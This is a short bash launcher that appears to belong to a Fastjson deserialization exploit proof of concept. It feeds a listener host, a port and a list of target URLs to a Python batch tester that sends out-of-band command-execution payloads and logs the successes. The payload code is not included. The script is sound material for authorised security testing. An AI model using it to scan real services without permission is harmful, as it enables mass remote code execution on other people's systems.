#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

usage() {
    cat <<'USAGE'
Usage:
  scripts/batch-http-test.sh <LHOST> <LPORT> <URL_FILE> [ENDPOINT]

URL_FILE:
  One HTTP/HTTPS URL per line. Empty lines and lines starting with # are ignored.
  If ENDPOINT is omitted, each line is treated as the full JSON endpoint URL.
  If ENDPOINT is provided, each line is treated as a service base URL/host.

Examples:
  scripts/batch-http-test.sh 172.20.10.2 19090 urls.txt
  scripts/batch-http-test.sh 172.20.10.2 19090 hosts.txt /parse

Environment:
  CMD=id-oob
  MODES="jdk8-http fd"
  WAIT=15
  MAX_FD=256
  TAG=batch01
  OUT=/tmp/fastjson-results.jsonl
  LOG_DIR=/tmp/fastjson-batch
USAGE
}

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ] || [ "$#" -lt 3 ]; then
    usage
    exit 0
fi

LHOST="$1"
LPORT="$2"
URL_FILE="$3"
ENDPOINT="${4:-}"

args=(
    --lhost "$LHOST"
    --lport "$LPORT"
    --urls "$URL_FILE"
    --cmd "${CMD:-id-oob}"
    --modes "${MODES:-jdk8-http fd}"
    --wait "${WAIT:-15}"
    --max-fd "${MAX_FD:-256}"
)

if [ -n "$ENDPOINT" ]; then
    args+=(--endpoint "$ENDPOINT")
fi
if [ -n "${TAG:-}" ]; then
    args+=(--tag-prefix "$TAG")
fi
if [ -n "${OUT:-}" ]; then
    args+=(--out "$OUT")
fi
if [ -n "${LOG_DIR:-}" ]; then
    args+=(--log-dir "$LOG_DIR")
fi
if [ "${STOP_ON_SUCCESS:-1}" = "0" ]; then
    args+=(--no-stop-on-success)
fi

python3 -u poc/batch_http_test.py "${args[@]}"
